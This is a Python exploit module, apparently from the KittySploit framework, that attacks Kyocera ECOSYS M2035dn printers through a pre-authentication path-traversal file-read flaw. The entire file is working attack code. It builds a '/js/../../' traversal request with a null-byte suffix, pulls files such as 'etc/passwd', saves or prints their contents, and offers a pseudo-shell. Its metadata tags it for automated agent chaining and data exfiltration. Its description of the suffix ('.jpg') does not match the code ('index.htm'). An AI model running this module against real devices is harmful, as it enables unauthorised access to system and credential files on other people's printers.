#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Kyocera Command Center RX ECOSYS M2035dn pre-auth LFI file read."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.lfi import Lfi


class Module(Auxiliary, Http_client, Lfi):
    __info__ = {
        "name": "Kyocera M2035dn Pre-Auth LFI File Read",
        "description": (
            "Reads arbitrary files from Kyocera Command Center RX ECOSYS M2035dn "
            "printers via /js/ traversal with a .jpg null suffix."
        ),
        "author": ["KittySploit Team"],
        "platform": Platform.LINUX,
        "references": [
            "https://www.exploit-db.com/exploits/50738",
        ],
        "tags": ["kyocera", "printer", "ecosys", "lfi", "file-read", "unauth"],
        "agent": {
            "risk": "intrusive",
            "effects": ["data_exfiltration"],
            "expected_requests": 1,
            "reversible": True,
            "approval_required": True,
            "produces": ["risk_signals"],
            "requires": {
                "tech_hints_any": ["kyocera"],
                "endpoint_pattern_any": ["/js/"],
            },
            "chain": {
                "produces_capabilities": [{"capability": "file_read", "from_detail": "pre-auth LFI"}],
                "suggested_followups": ["scanner/http/kyocera_m2035dn_lfi_detect"],
            },
        },
    }

    port = OptPort(80, "Kyocera HTTP port", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    traversal = OptString(
        "/js/../../../../../../../../",
        "Traversal prefix before the target file",
        False,
        advanced=True,
    )
    file_read = OptString("etc/passwd", "Remote file path to read", True)
    output_file = OptString("", "Local path to write retrieved content", False)
    output_limit = OptInteger(12000, "Max chars to print when output_file empty (0=full)", False, advanced=True)

    def execute(self, file_path: str) -> str:
        prefix = str(self.traversal or "/js/../../../../../../../../").rstrip("/")
        remote = str(file_path or "").lstrip("/")
        path = f"{prefix}/{remote}%00index.htm"
        response = self.http_request(
            method="GET",
            path=path,
            allow_redirects=False,
            timeout=int(self.timeout or 20),
        )
        if not response or int(response.status_code or 0) != 200:
            return ""
        return response.text or ""

    def run(self):
        if bool(self.shell_lfi):
            print_status("Kyocera M2035dn LFI pseudo-shell")
            self.handler_lfi()
            return True

        target = str(self.file_read or "etc/passwd").strip()
        print_status(f"Reading {target} via Kyocera LFI")
        data = self.execute(target)
        if not data:
            print_error("File read failed or returned empty body")
            return False

        local = str(self.output_file or "").strip()
        if local:
            with open(local, "w", encoding="utf-8", errors="ignore") as fh:
                fh.write(data)
            print_success(f"Wrote {len(data)} bytes to {local}")
        else:
            limit = int(self.output_limit or 0)
            print_info(data if limit <= 0 else data[:limit] + "\n... [truncated]")
        return True
